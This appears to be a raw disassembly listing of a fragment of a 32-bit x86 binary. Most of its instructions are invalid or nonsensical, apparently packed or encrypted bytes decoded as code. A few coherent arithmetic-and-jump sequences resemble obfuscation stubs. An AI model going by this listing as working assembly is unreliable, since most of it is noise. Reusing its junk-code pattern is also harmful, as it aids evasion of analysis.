  40d2ed:	push   edi
  40d2ee:	fstp   DWORD PTR [esi-0x2e658708]
  40d2f4:	sbb    bh,BYTE PTR [ecx-0x3a]
  40d2f7:	fldenv [eax+0x6ce3ad6]
  40d2fd:	outs   dx,DWORD PTR ds:[esi]
  40d2fe:	mov    esi,0x2536e5d8
  40d303:	mov    WORD PTR [esi-0x47],es
  40d306:	ret    0x93e2
  40d309:	ins    DWORD PTR es:[edi],dx
  40d30a:	pop    ds
  40d30b:	pop    ss
  40d30c:	mov    cl,0xe4
  40d30e:	mov    edi,0x95bae7c4
  40d313:	std    
  40d314:	mov    dh,0x96
  40d316:	inc    esi
  40d317:	fnstsw WORD PTR [eax+0x1bf28dfa]
  40d31d:	nop
  40d31e:	test   DWORD PTR [ecx+0x61],edi
  40d321:	in     eax,0x14
  40d323:	daa    
  40d324:	push   eax
  40d325:	sbb    DWORD PTR [edx+edi*4+0x57],edx
  40d329:	mov    al,ds:0xf3b70a73
  40d32e:	jne    0x40d332
  40d330:	lahf   
  40d331:	scas   eax,DWORD PTR es:[edi]
  40d332:	dec    ebx
  40d333:	push   0x59
  40d335:	pop    edi
  40d336:	and    BYTE PTR [esi-0x3ee572f],cl
  40d33c:	mov    cl,0xc1
  40d33e:	clc    
  40d33f:	or     DWORD PTR [edx+eiz*4+0x6f],ebp
  40d343:	cmp    al,0x96
  40d345:	sbb    eax,DWORD PTR [edi]
  40d347:	pop    edi
  40d348:	out    0x3,al
  40d34a:	xor    eax,0x45b16749
  40d34f:	xor    DWORD PTR [ecx],esi
  40d351:	xchg   DWORD PTR [ecx-0x9529dcc],ebp
  40d357:	push   cs
  40d358:	in     al,0xd
  40d35a:	leave  
  40d35b:	ret    
  40d35c:	and    ch,ah
  40d35e:	(bad)  
  40d35f:	jl     0x40d36e
  40d361:	pmaddwd mm0,QWORD PTR [edi-0x43]
  40d365:	xor    al,0x1f
  40d367:	push   esp
  40d368:	lods   al,BYTE PTR ds:[esi]
  40d369:	sub    eax,0x8dd75080
  40d36e:	pop    es
  40d36f:	xor    eax,0x6b670c10
  40d374:	nop
  40d375:	(bad)  
  40d376:	cmp    eax,0x836bb0f9
  40d37b:	lea    ebx,[esi+0x56e7688d]
  40d381:	and    DWORD PTR [ebp+0x32],eax
  40d384:	pop    edi
  40d385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d386:	jg     0x40d392
  40d388:	cli    
  40d389:	mov    esi,0xb273a1db
  40d38e:	xlat   BYTE PTR ds:[ebx]
  40d38f:	in     eax,dx
  40d390:	in     eax,dx
  40d391:	repnz stos DWORD PTR es:[edi],eax
  40d393:	xchg   ebp,eax
  40d394:	push   ecx
  40d395:	lea    ecx,[eax]
  40d397:	(bad)  
  40d398:	mov    ecx,0xa9e7fd0e
  40d39d:	push   ds
  40d39e:	push   edi
  40d39f:	ja     0x40d36a
  40d3a1:	dec    ebp
  40d3a2:	and    BYTE PTR [ecx-0x4a],cl
  40d3a5:	in     al,dx
  40d3a6:	xor    ecx,DWORD PTR [eax-0x75]
  40d3a9:	cmp    esp,0x7d4683ef
  40d3af:	out    0x50,al
  40d3b1:	xchg   esi,eax
  40d3b2:	aaa    
  40d3b3:	retf   
  40d3b4:	bound  ebx,QWORD PTR [ebp+0x219cd04d]
  40d3ba:	fnstenv [edx+0xc22ba13]
  40d3c0:	hlt    
  40d3c1:	and    bh,BYTE PTR [ebp+edx*2-0x161c5ed6]
  40d3c8:	or     bl,BYTE PTR [esi-0x2a]
  40d3cb:	dec    ebp
  40d3cc:	adc    dl,BYTE PTR [esi-0x7c1fca6]
  40d3d2:	fisubr DWORD PTR [esi+0x60]
  40d3d5:	inc    edx
  40d3d6:	jo     0x40d402
  40d3d8:	ja     0x40d362
  40d3da:	jge    0x40d396
  40d3dc:	sub    BYTE PTR [di+0x7840],dh
  40d3e1:	jb     0x40d406
  40d3e3:	sahf   
  40d3e4:	inc    ebx
  40d3e5:	out    dx,al
  40d3e6:	mov    ch,BYTE PTR [ecx]
  40d3e8:	mov    esp,0xc8ac81ee
  40d3ed:	add    bh,dl
  40d3ef:	sbb    eax,0x8cae049f
  40d3f4:	(bad)  
  40d3f5:	popa   
  40d3f6:	aas    
  40d3f7:	mov    eax,DWORD PTR ds:0x4516fff0
  40d3fd:	mov    edi,0x9ba81b20
  40d402:	xor    al,0xdb
  40d404:	inc    edx
  40d405:	shl    bl,1
  40d407:	push   edx
  40d408:	push   DWORD PTR [esi+eax*2-0x7b]
  40d40c:	jnp    0x40d43f
  40d40e:	push   ss
  40d40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d410:	scas   al,BYTE PTR es:[edi]
  40d411:	ds push 0xffffffbf
  40d414:	xchg   ecx,eax
  40d415:	aam    0xc2
  40d417:	cli    
  40d418:	neg    al
  40d41a:	into   
  40d41b:	xchg   edi,eax
  40d41c:	outs   dx,DWORD PTR ds:[esi]
  40d41d:	nop
  40d41e:	aad    0x81
  40d420:	call   0xf73dd381
  40d425:	ja     0x40d449
  40d427:	mov    ecx,0xce1f4406
  40d42c:	jne    0x40d452
  40d42e:	sti    
  40d42f:	mov    edx,0xaf071af4
  40d434:	iret   
  40d435:	ja     0x40d428
  40d437:	icebp  
  40d438:	push   eax
  40d439:	(bad)  
  40d43a:	std    
  40d43b:	xchg   ebx,eax
  40d43c:	sbb    al,0x7b
  40d43e:	lock dec edx
  40d440:	lahf   
  40d441:	jge    0x40d42e
  40d443:	mov    bh,0xec
  40d445:	jg     0x40d4c0
  40d447:	inc    eax
  40d448:	add    al,0x25
  40d44a:	or     al,0x27
  40d44c:	popa   
  40d44d:	iret   
  40d44e:	mov    eax,0xf7818058
  40d453:	dec    ebx
  40d454:	cmp    bh,BYTE PTR [ecx+0x3e563f22]
  40d45a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d45b:	fcomp  QWORD PTR [ebp+0x109841c6]
  40d461:	fnstcw WORD PTR [edi]
  40d463:	push   ds
  40d464:	mov    esp,0x429fa129
  40d469:	inc    ecx
  40d46a:	dec    ecx
  40d46b:	cmp    al,0x56
  40d46d:	jg     0x40d4bd
  40d46f:	mov    ds:0x1c7ddf5,al
  40d474:	and    BYTE PTR [ecx+0x34d65058],bl
  40d47a:	mov    bh,0x45
  40d47c:	loop   0x40d4cd
  40d47e:	adc    ebx,ecx
  40d480:	stos   BYTE PTR es:[edi],al
  40d481:	jmp    0xc676:0xcc496fef
  40d488:	cli    
  40d489:	adc    DWORD PTR [eax+edx*8-0x22530a2e],0x73bff8c
  40d494:	xor    DWORD PTR [ebp-0x15],eax
  40d497:	cmp    al,0x13
  40d499:	dec    esp
  40d49a:	nop
  40d49b:	scas   al,BYTE PTR es:[edi]
  40d49c:	icebp  
  40d49d:	cmp    BYTE PTR [esi-0x4437709c],ch
  40d4a3:	fwait
  40d4a4:	lods   eax,DWORD PTR ds:[esi]
  40d4a5:	mov    al,0x39
  40d4a7:	add    dh,bh
  40d4a9:	sub    DWORD PTR [esi+0x1b80eefa],edi
  40d4af:	sbb    cl,BYTE PTR [ecx+0x377156fc]
  40d4b5:	xchg   ebx,ebx
  40d4b7:	ret    0xc73a
  40d4ba:	xor    al,0xce
  40d4bc:	xlat   BYTE PTR ds:[ebx]
  40d4bd:	cmp    esi,ebx
  40d4bf:	xchg   ah,dh
  40d4c1:	jg     0x40d4c1
  40d4c3:	jp     0x40d4fb
  40d4c5:	push   eax
  40d4c6:	sub    BYTE PTR [ebx-0xaca8bfa],ah
  40d4cc:	int3   
  40d4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4ce:	jnp    0x40d4f1
  40d4d0:	(bad)  [ebx-0x78]
  40d4d3:	test   DWORD PTR [edx-0x7d4c19c5],edx
  40d4d9:	lock adc cl,dh
  40d4dc:	fmul   QWORD PTR [edx]
  40d4de:	les    eax,FWORD PTR [ecx-0x6728a2a3]
  40d4e4:	imul   edx
  40d4e6:	xor    ah,BYTE PTR [esp+eax*2]
  40d4e9:	ds cdq 
  40d4eb:	test   al,0x45
  40d4ed:	xor    eax,0xf720228
  40d4f2:	adc    edx,DWORD PTR [edx-0x49]
  40d4f5:	imul   edi,ebx,0x44612a4c
  40d4fb:	ins    DWORD PTR es:[edi],dx
  40d4fc:	or     cl,BYTE PTR [eax]
  40d4fe:	xor    eax,DWORD PTR [edi]
  40d500:	push   cs
  40d501:	jo     0x40d530
  40d503:	inc    eax
  40d504:	xor    DWORD PTR [esi-0x2fa17a0b],esp
  40d50a:	cmp    esi,esp
  40d50c:	out    0x6f,eax
  40d50e:	pop    ebp
  40d50f:	jno    0x40d515
  40d511:	ret    
  40d512:	mov    DWORD PTR [ebx-0x3],0x4b4d0088
  40d519:	aad    0x77
  40d51b:	push   0x72
  40d51d:	mov    dh,BYTE PTR [ebp-0x2c]
  40d520:	mov    WORD PTR [esi],gs
  40d522:	mov    al,0x34
  40d524:	lods   al,BYTE PTR ds:[esi]
  40d525:	dec    eax
  40d526:	mov    esi,0x19aaf6c5
  40d52b:	(bad)  
  40d52c:	in     al,dx
  40d52d:	fcomp  QWORD PTR [eax-0x59]
  40d530:	bound  ebp,QWORD PTR [edx+edi*2]
  40d533:	push   esi
  40d534:	lds    edx,FWORD PTR [ecx]
  40d536:	push   ecx
  40d537:	xor    al,0xee
  40d539:	test   al,0xf6
  40d53b:	dec    ebx
  40d53c:	dec    esi
  40d53d:	jo     0x40d557
  40d53f:	jecxz  0x40d4d0
  40d541:	retf   0x4cde
  40d544:	xor    edi,0x5989a82d
  40d54a:	jbe    0x40d5c6
  40d54c:	cmc    
  40d54d:	xchg   esp,eax
  40d54e:	rcr    BYTE PTR [ecx+0x75041c2e],0x22
  40d555:	iret   
  40d556:	mov    ebp,esi
  40d558:	outs   dx,DWORD PTR ds:[esi]
  40d559:	push   ebx
  40d55a:	enter  0xa95a,0x21
  40d55e:	das    
  40d55f:	ins    DWORD PTR es:[edi],dx
  40d560:	push   ebp
  40d561:	js     0x40d5b9
  40d563:	mov    eax,ds:0x5040ad07
  40d568:	pop    ebx
  40d569:	adc    ecx,ebp
  40d56b:	pop    edi
  40d56c:	inc    ebp
  40d56d:	pop    ecx
  40d56e:	mov    al,0x42
  40d570:	xor    eax,0x6d6a5497
  40d575:	adc    al,0x55
  40d577:	mov    bh,0x52
  40d579:	push   ds
  40d57a:	xchg   edi,eax
  40d57b:	je     0x40d504
  40d57d:	das    
  40d57e:	ret    
  40d57f:	shr    DWORD PTR [esi+0x6],1
  40d582:	sub    al,0x9
  40d584:	ror    BYTE PTR [ebx],1
  40d586:	xchg   edx,eax
  40d587:	mov    al,0x3c
  40d589:	pop    eax
  40d58a:	dec    edx
  40d58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d58c:	pusha  
  40d58d:	daa    
  40d58e:	push   ebp
  40d58f:	lock das 
  40d591:	cmp    al,0x39
  40d593:	test   al,0xa
  40d595:	enter  0x2df3,0x92
  40d599:	sub    al,0x26
  40d59b:	lds    esi,FWORD PTR [ecx-0x1e238245]
  40d5a1:	cmp    al,0xc2
  40d5a3:	sub    edi,DWORD PTR [ecx+0x5dda426d]
  40d5a9:	cmp    eax,0xdbf183f
  40d5ae:	xchg   ecx,eax
  40d5af:	xchg   esp,eax
  40d5b0:	pop    ebp
  40d5b1:	icebp  
  40d5b2:	dec    ebx
  40d5b3:	jbe    0x40d558
  40d5b5:	aas    
  40d5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b7:	popa   
  40d5b8:	mov    BYTE PTR [eax+0x1f14af3d],0xee
  40d5bf:	fidivr WORD PTR [edi]
  40d5c1:	fucomi st,st(0)
  40d5c3:	jecxz  0x40d589
  40d5c5:	pop    ebx
  40d5c6:	out    0x99,al
  40d5c8:	adc    BYTE PTR [ecx-0x10],ah
  40d5cb:	mov    ds:0xd86c871a,eax
  40d5d0:	sub    ecx,DWORD PTR [ebx+ebx*2]
  40d5d3:	inc    edx
  40d5d4:	stos   DWORD PTR es:[edi],eax
  40d5d5:	lock mov bl,0x9a
  40d5d8:	sbb    eax,0x795b0a18
  40d5dd:	out    0xcf,eax
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d642
  40d62d:	aam    0xb9
  40d62f:	sub    edx,DWORD PTR cs:[eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	and    cl,bl
  40d63a:	inc    ebx
  40d63b:	or     DWORD PTR [esi-0x10],0xffffffbd
  40d63f:	sti    
  40d640:	mov    dl,0xbe
  40d642:	mov    al,0x19
  40d644:	inc    ebx
  40d645:	ins    DWORD PTR es:[edi],dx
  40d646:	jb     0x40d659
  40d648:	ins    BYTE PTR es:[edi],dx
  40d649:	xchg   edi,eax
  40d64a:	lahf   
  40d64b:	outs   dx,DWORD PTR ds:[esi]
  40d64c:	sub    al,0xe9
  40d64e:	mov    ds:0xc66115b4,al
  40d653:	shr    bh,cl
  40d655:	mov    gs,WORD PTR [edx]
  40d657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d658:	loopne 0x40d624
  40d65a:	jne    0x40d61f
  40d65c:	test   eax,0x6488915c
  40d661:	mov    ebp,eax
  40d663:	outs   dx,BYTE PTR ds:[esi]
  40d664:	fisttp QWORD PTR [esi+ebx*4-0x1d]
  40d668:	jge    0x40d6cb
  40d66a:	ss mov esi,0xb2f4e29b
  40d670:	aaa    
  40d671:	fcmovnb st,st(7)
  40d673:	mov    bh,0x59
  40d675:	fisttp QWORD PTR [esi+0x46]
  40d678:	sub    al,BYTE PTR [ecx+edi*1+0x5e56a23a]
  40d67f:	dec    eax
  40d680:	out    0x80,al
  40d682:	sbb    BYTE PTR [ebp-0x5610a08c],dh
  40d688:	fnstsw WORD PTR [ebx]
  40d68a:	(bad)  
  40d68b:	push   ebp
  40d68c:	xchg   esp,eax
  40d68d:	retf   
  40d68e:	push   es
  40d68f:	inc    ecx
  40d690:	repnz xchg esp,eax
  40d692:	or     dl,BYTE PTR [edi+edx*8-0x12e3b47a]
  40d699:	cmp    eax,0x685ea966
  40d69e:	sub    ecx,0x66e75a71
  40d6a4:	fadd   DWORD PTR [ebx-0x67a3dc5]
  40d6aa:	push   cs
  40d6ab:	pusha  
  40d6ac:	outs   dx,DWORD PTR ds:[esi]
  40d6ad:	lods   al,BYTE PTR ds:[esi]
  40d6ae:	jne    0x40d646
  40d6b0:	fisubr WORD PTR [ebp+0x75]
  40d6b3:	sub    eax,0x3f7356c2
  40d6b8:	xor    eax,0x5435d9ca
  40d6bd:	cmp    ch,BYTE PTR [ebx+0x15]
  40d6c0:	je     0x40d6bc
  40d6c2:	aam    0x1a
  40d6c4:	push   0x71
  40d6c6:	clc    
  40d6c7:	pop    edx
  40d6c8:	push   ebx
  40d6c9:	inc    ebx
  40d6ca:	es xchg edi,eax
  40d6cc:	jae    0x40d6f9
  40d6ce:	xor    BYTE PTR [ecx+esi*2-0x5b72edcb],ch
  40d6d5:	pushf  
  40d6d6:	pop    ebx
  40d6d7:	in     al,0xf0
  40d6d9:	mov    bh,0x77
  40d6db:	mov    eax,fs:0x7a5cfee7
  40d6e1:	pop    ebp
  40d6e2:	dec    esp
  40d6e3:	lods   eax,DWORD PTR ds:[esi]
  40d6e4:	fild   DWORD PTR [esi+0x430fa9d7]
  40d6ea:	jns    0x40d6eb
  40d6ec:	and    DWORD PTR [ebp+0x23bad884],ebp
  40d6f2:	sub    esp,0xffffffbf
  40d6f5:	inc    ebp
  40d6f6:	std    
  40d6f7:	push   ebp
  40d6f8:	push   ecx
  40d6f9:	lock out dx,eax
  40d6fb:	je     0x40d768
  40d6fd:	in     eax,dx
  40d6fe:	lea    ecx,[eax]
  40d700:	jns    0x40d778
  40d702:	jmp    0xefb60a9a
  40d707:	adc    esi,esi
  40d709:	mov    ss,esp
  40d70b:	xchg   ecx,eax
  40d70c:	xor    cl,cl
  40d70e:	jbe    0x40d6f9
  40d710:	add    BYTE PTR [ebp+0x486ff4c],0xfb
  40d717:	mov    esi,ebp
  40d719:	jg     0x40d747
  40d71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d71c:	jns    0x40d737
  40d71e:	bound  eax,QWORD PTR [ebx-0x5a]
  40d721:	retf   0xe8a1
  40d724:	aad    0xe4
  40d726:	push   esi
  40d727:	inc    esi
  40d728:	or     DWORD PTR [ebx+0x61d0f83d],esi
  40d72e:	push   cs
  40d72f:	mov    bl,0x7a
  40d732:	cmp    ebp,DWORD PTR [eax-0x3]
  40d735:	sub    DWORD PTR [eax+0xf],ebx
  40d738:	popa   
  40d739:	mov    edx,0xbdbf52e4
  40d73e:	mov    edi,DWORD PTR [ecx]
  40d740:	fisub  WORD PTR [edi-0x27b91e36]
  40d746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d747:	loope  0x40d71e
  40d749:	mov    al,0x54
  40d74b:	pusha  
  40d74c:	jp     0x40d702
  40d74e:	mov    DWORD PTR [ebx],esp
  40d750:	imul   ebx,edi,0x5
  40d753:	mov    WORD PTR [edx],fs
  40d755:	leave  
  40d756:	cld    
  40d757:	xor    bl,bh
  40d759:	pop    DWORD PTR [edx-0xd16dd70]
  40d75f:	inc    esi
  40d760:	mov    eax,ds:0xf031dfa9
  40d765:	sbb    BYTE PTR [eax-0x5b1bcc25],0x1c
  40d76c:	test   BYTE PTR [esi],al
  40d76e:	jbe    0x40d7e1
  40d770:	jb     0xf879015d
  40d776:	jbe    0x40d789
  40d778:	in     al,0xc9
  40d77a:	fdivr  QWORD PTR [esp+eax*2+0x1b390a53]
  40d781:	or     al,0xb5
  40d783:	mov    edi,0x5db08860
  40d788:	pop    esp
  40d789:	mov    dl,0xed
  40d78b:	mov    eax,0x284b6303
  40d790:	fisub  DWORD PTR [ebx-0x180f4628]
  40d796:	test   al,0x4f
  40d798:	aas    
  40d799:	sub    edx,DWORD PTR [eax]
  40d79b:	loopne 0x40d73a
  40d79d:	mov    bh,0xe4
  40d79f:	xchg   esi,eax
  40d7a0:	mov    bl,0xf6
  40d7a2:	mov    ds:0x216fa7d4,al
  40d7a7:	pop    ebp
  40d7a8:	push   eax
  40d7a9:	xchg   ecx,eax
  40d7aa:	push   es
  40d7ab:	mov    dl,0x25
  40d7ad:	mov    bh,0x3f
  40d7af:	mov    bh,0x40
  40d7b1:	imul   edi,eax,0xe61bfdfe
  40d7b7:	ret    0x6384
  40d7ba:	(bad)  
  40d7bb:	loop   0x40d833
  40d7bd:	into   
  40d7be:	shr    DWORD PTR [edi-0x1],cl
  40d7c1:	mov    WORD PTR [ebx+eax*1],ss
  40d7c4:	and    DWORD PTR [esi+0x60],edi
  40d7c7:	sti    
  40d7c8:	jg     0x40d7c8
  40d7ca:	mov    cl,0x3e
  40d7cc:	scas   eax,DWORD PTR es:[edi]
  40d7cd:	adc    BYTE PTR [eax+eiz*8+0x3],dh
  40d7d1:	xchg   esp,eax
  40d7d2:	repnz push 0x1b9ebf5a
  40d7d8:	mov    bh,0x5d
  40d7da:	js     0x40d778
  40d7dc:	test   al,0xb7
  40d7de:	icebp  
  40d7df:	dec    esp
  40d7e0:	sub    BYTE PTR [esi+0x73],bl
  40d7e3:	int3   
  40d7e4:	icebp  
  40d7e5:	dec    ebp
  40d7e6:	aaa    
  40d7e7:	(bad)  
  40d7e8:	push   ss
  40d7e9:	rcr    bl,0xe6
  40d7ec:	dec    esp
  40d7ed:	push   ds
  40d7ee:	sahf   
  40d7ef:	jp     0x40d805
  40d7f1:	test   al,0xb3
  40d7f3:	xor    DWORD PTR [eax],eax
  40d7f5:	lock call 0xfd12fcda
  40d7fb:	mov    esi,0x6d5c9ebb
  40d800:	(bad)  
  40d801:	mov    ds:0xa11bc7cd,al
  40d806:	aas    
  40d807:	and    BYTE PTR [ebx+edi*1-0x20],al
  40d80b:	out    dx,al
  40d80c:	xchg   edi,eax
  40d80d:	scas   eax,DWORD PTR es:[edi]
  40d80e:	ja     0x40d886
  40d810:	popa   
  40d811:	out    dx,al
  40d812:	icebp  
  40d813:	popf   
  40d814:	mov    esi,0x7cd97f61
  40d819:	mov    al,0x3f
  40d81b:	mov    esi,0x1b48622c
  40d820:	cdq    
  40d821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d822:	mov    BYTE PTR [ebp-0x342e0278],bl
  40d828:	mov    bh,0x68
  40d82a:	xchg   DWORD PTR [ecx+0x9],ecx
  40d82d:	inc    ebp
  40d82e:	push   edx
  40d82f:	inc    ebp
  40d830:	mov    dh,BYTE PTR [esi+0x7c29e9c9]
  40d836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d837:	add    dh,BYTE PTR [ecx+0x31b1f0e8]
  40d83d:	mov    ds:0x11aa8f07,al
  40d842:	test   DWORD PTR [eax-0x2bc1c91a],edx
  40d848:	loopne 0x40d829
  40d84a:	imul   BYTE PTR [esi-0x320995a7]
  40d850:	ret    0x93af
  40d853:	cmp    bl,BYTE PTR [ebp+0x65]
  40d856:	icebp  
  40d857:	or     eax,0xd411db4c
  40d85c:	cmc    
  40d85d:	lahf   
  40d85e:	out    0xde,ax
  40d861:	lock mov esi,0x853c1e40
  40d867:	xchg   BYTE PTR [ecx+0x68],dl
  40d86a:	mov    esi,0x24dfcb47
  40d86f:	jg     0x40d86b
  40d871:	or     eax,0xa6051304
  40d876:	lods   al,BYTE PTR ds:[esi]
  40d877:	adc    eax,0x8237941
  40d87c:	mov    bh,0xb2
  40d87f:	sbb    al,cl
  40d881:	xchg   esi,eax
  40d882:	out    dx,al
  40d883:	adc    al,BYTE PTR [eax]
  40d885:	ins    BYTE PTR es:[edi],dx
  40d886:	pop    ebx
  40d887:	jbe    0x40d842
  40d889:	add    eax,DWORD PTR [bx+di+0x62]
  40d88d:	loopne 0x40d8e5
  40d88f:	aaa    
  40d890:	xchg   esi,eax
  40d891:	into   
  40d892:	ss inc esi
  40d894:	fcmovnu st,st(6)
  40d896:	lods   eax,DWORD PTR ds:[esi]
  40d897:	les    edi,FWORD PTR [esi]
  40d899:	jle    0x40d876
  40d89b:	arpl   WORD PTR [esi-0x132e422e],cx
  40d8a1:	sub    eax,0xe5c053b2
  40d8a6:	call   0xfdbe:0xd3503625
  40d8ad:	out    0x1c,al
  40d8af:	jp     0x40d8d9
  40d8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b2:	rcr    BYTE PTR [ebx],1
  40d8b4:	mov    ebp,0x88863561
  40d8b9:	bswap  ebx
  40d8bb:	pop    es
  40d8bc:	imul   ecx,DWORD PTR [edx+0x42],0xfffffff6
  40d8c0:	xchg   esp,eax
  40d8c1:	mov    al,ds:0xbd0b34e7
  40d8c6:	and    BYTE PTR [edi+0x705fb7d8],ch
  40d8cc:	push   0xd1098e48
  40d8d1:	popf   
  40d8d2:	in     al,dx
  40d8d3:	mov    DWORD PTR [eax],eax
  40d8d5:	icebp  
  40d8d6:	pushf  
  40d8d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8d8:	add    esp,edx
  40d8da:	arpl   WORD PTR [eax+0x529d930a],ax
  40d8e0:	sub    esi,eax
  40d8e2:	clc    
  40d8e3:	int3   
  40d8e4:	data16 clc 
  40d8e6:	xor    al,0x94
  40d8e8:	fmul   QWORD PTR [edi-0x9]
  40d8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ec:	lea    ebx,[esi+0x268bf990]
  40d8f2:	sub    BYTE PTR [ebp-0x33],bl
  40d8f5:	mov    WORD PTR [esi],ds
  40d8f7:	scas   eax,DWORD PTR es:[edi]
  40d8f8:	jg     0x40d94b
  40d8fa:	dec    esp
  40d8fb:	loopne 0x40d91f
  40d8fd:	xchg   esi,eax
  40d8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8ff:	add    al,0x34
  40d901:	ror    dh,1
  40d903:	xlat   BYTE PTR ds:[ebx]
  40d904:	sbb    ch,BYTE PTR [ebp+0x3e443c0f]
  40d90a:	push   ebx
  40d90b:	pusha  
  40d90c:	rol    DWORD PTR [ecx+0x63],0x43
  40d910:	add    DWORD PTR [eax-0x78],0xc4928ba6
  40d917:	into   
  40d918:	dec    edi
  40d919:	out    0x6f,eax
  40d91b:	lahf   
  40d91c:	ficom  DWORD PTR ds:0x3c6643e0
  40d922:	retf   0x6d52
  40d925:	push   ebp
  40d926:	shl    DWORD PTR [edx],0x70
  40d929:	leavew 
  40d92b:	in     eax,dx
  40d92c:	xchg   ecx,eax
  40d92d:	jl     0x40d976
  40d92f:	and    eax,0xc690a5a6
  40d934:	jae    0x40d91f
  40d936:	jo     0x40d941
  40d938:	data16 lods al,BYTE PTR ds:[esi]
  40d93a:	xchg   esi,eax
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	push   es
  40d956:	out    dx,al
  40d957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d958:	cwde   
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	aas    
  40d962:	mov    eax,0x4128a9b
  40d967:	jge    0x40d90f
  40d969:	mov    ecx,0x42e3656b
  40d96e:	inc    edi
  40d96f:	call   0xd60d:0xb4924d37
  40d976:	cld    
  40d977:	jecxz  0x40d9ba
  40d979:	xchg   esp,eax
  40d97a:	gs cmc 
  40d97c:	sub    ebx,edx
  40d97e:	xchg   esp,eax
  40d97f:	inc    eax
  40d980:	fsubr  QWORD PTR [edx-0x6321e33c]
  40d986:	mov    ebp,DWORD PTR [esi]
  40d988:	mov    ebx,0xa220417f
  40d98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d98e:	mov    al,bh
  40d990:	faddp  st(3),st
  40d992:	pop    eax
  40d993:	test   al,0x70
  40d995:	(bad)  
  40d996:	mov    fs,WORD PTR [edi-0x2]
  40d999:	retf   0xc64c
  40d99c:	test   al,0x2e
  40d99e:	cs cmp al,0x68
  40d9a1:	(bad)  
  40d9a2:	neg    al
  40d9a4:	and    DWORD PTR [ecx-0x55],esi
  40d9a7:	xchg   ebx,ecx
  40d9a9:	jmp    0xd9c3dd9f
  40d9ae:	clc    
  40d9af:	ins    DWORD PTR es:[edi],dx
  40d9b0:	fmul   QWORD PTR [esi+0x4283276b]
  40d9b6:	adc    DWORD PTR [ecx],edx
  40d9b8:	imul   ebp,DWORD PTR [ebx+0x6c],0xc338e9fa
  40d9bf:	fcom   QWORD PTR [edx+edi*8-0x55]
  40d9c3:	xchg   ebp,eax
  40d9c4:	adc    ebp,DWORD PTR [esi-0x10]
  40d9c7:	sbb    BYTE PTR [edx],al
  40d9c9:	sbb    eax,ebp
  40d9cb:	hlt    
  40d9cc:	out    0x77,eax
  40d9ce:	mov    bh,0x9e
  40d9d0:	push   ebx
  40d9d1:	mov    esp,0xe8530f71
  40d9d6:	mov    BYTE PTR [esi+0x3c],dh
  40d9d9:	(bad)  [ebx]
  40d9db:	cmp    al,0xdd
  40d9dd:	pop    edi
  40d9de:	jo     0x40d9cf
  40d9e0:	ins    BYTE PTR es:[edi],dx
  40d9e1:	and    ebx,DWORD PTR [ebx]
  40d9e3:	mov    edi,0x52fda8b6
  40d9e8:	inc    edi
  40d9e9:	mov    ds:0x8b9b3757,al
  40d9ee:	inc    esp
  40d9ef:	xchg   edi,eax
  40d9f0:	xor    esi,esi
  40d9f2:	add    al,0xff
  40d9f4:	jno    0x40d9a2
  40d9f6:	jbe    0x40da2c
  40d9f8:	mov    eax,es:0x13d1815c
  40d9fe:	push   edi
  40d9ff:	cmp    DWORD PTR [edx],ebp
  40da01:	jne    0x40da48
  40da03:	repz vpaddd ymm7,ymm7,YMMWORD PTR ss:[esi-0x74]
  40da0a:	add    edx,DWORD PTR [edx]
  40da0c:	dec    esp
  40da0d:	outs   dx,DWORD PTR ds:[esi]
  40da0e:	dec    esp
  40da0f:	les    esp,FWORD PTR [ecx-0x1]
  40da12:	jae    0x40da2c
  40da14:	or     DWORD PTR [ebp-0x3b69d9f5],esi
  40da1a:	or     eax,DWORD PTR [ecx-0x78]
  40da1d:	pop    ebp
  40da1e:	cmp    DWORD PTR [esi+ecx*2+0x1a36ad96],edx
  40da25:	imul   edi,DWORD PTR [ecx-0x2f2c237b],0x4f
  40da2c:	mov    dl,0x7c
  40da2e:	imul   ecx,DWORD PTR [eax+0x2b],0x993c1774
